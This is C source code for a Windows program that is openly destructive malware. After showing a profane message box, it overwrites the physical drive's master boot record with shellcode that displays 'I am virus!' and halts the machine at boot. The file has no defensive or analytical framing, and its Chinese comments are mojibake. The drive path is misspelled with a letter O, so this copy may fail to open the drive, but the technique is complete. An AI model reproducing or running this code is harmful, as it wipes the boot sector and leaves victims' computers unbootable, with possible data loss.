// MBRը�� 
#include "StdAfx.h"
#include <windows.h>
#include <winioctl.h>
 
int killMBR();
 
int APIENTRY WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd )
{
 
	MessageBox(NULL,"Fuck MBR!","Fuck!",0);
	killMBR();
	return 0;
}
unsigned char scode[]="\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c\x00\xba\x1d\x0e\xcd\x10\xe2\xfe\x49\x20\x61\x6d\x20\x76\x69\x72\x75\x73\x21\x20\x46\x75\x63\x6b\x20\x79\x6f\x75\x20\x3a\x2d\x29"; 
 
 
int killMBR() 
{
	HANDLE hDevice;
	DWORD dwBytesWritten,dwBytesReturned;
	BYTE pMBR[512]={0};
	memcpy(pMBR,scode,sizeof(scode)-1);//���¹���MBR
 
	pMBR[510]=0x55;
	pMBR[511]=0xAA;
	hDevice=CreateFile("\\\\.\\PHYSICALDRIVEO",
		GENERIC_READ|GENERIC_WRITE,
		FILE_SHARE_READ|FILE_SHARE_WRITE,
		NULL,OPEN_EXISTING,0,NULL);
	if(hDevice==INVALID_HANDLE_VALUE)
	{
 
		return -1;
	}
	DeviceIoControl(hDevice,FSCTL_LOCK_VOLUME,NULL,0,NULL,0,
		&dwBytesReturned,NULL);
	WriteFile(hDevice,pMBR,sizeof(pMBR),&dwBytesWritten,NULL);//д�벡������
 
	DeviceIoControl(hDevice,FSCTL_UNLOCK_VOLUME,NULL,0,NULL,0
		,&dwBytesReturned,NULL);
	CloseHandle(hDevice);
	ExitProcess(-1);
	return 0;
}
